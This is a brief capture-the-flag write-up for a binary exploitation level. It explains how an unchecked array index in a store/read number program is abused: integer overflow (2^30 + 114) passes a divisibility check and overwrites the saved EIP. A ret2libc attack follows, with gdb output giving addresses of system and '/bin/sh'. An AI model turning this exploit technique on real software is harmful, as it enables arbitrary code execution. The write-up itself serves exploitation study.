In this level provide a set of commands to execute:
- store : store a number at a given index
- read : read a number from a given index
- quit : exit the program

the program does not check the index if it is valid, only check if it is
divisible by 3 and does not have 0xbf in the highest byte

so we can try to override the EIP that is located after the int data array
but this index is divisible by 3 so we need to give a number that only gives 114 (after overflow)
so that we can erase the EIP

we can give 2 ^ 30 + 114 since after shifting by 2 to the left (to make the index valid for int array)
it will become 456 (114 * 4) and erase the EIP

all what we need now is finding address of system and address of "/bin/sh"

for "/bin/sh" :

(gdb) info proc mappings
process 3599

(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
1 pattern found.


for system :

(gdb) x system
0xf7e6aed0 <system>:	 "\203\354\034\211t$\024\213t$ \211\\$\020菮\016"
(gdb) p 0xf7e6aed0
$1 = 4159090384
(gdb) p 0xf7f897ec
$2 = 4160264172

for 2^30 + 114 it is equl to 1073741938

we need to store system at index 114 (1073741938), "/bin/sh" in index 116 (we can also store exit address in index 115 to exit gracefully after exiting the shell)
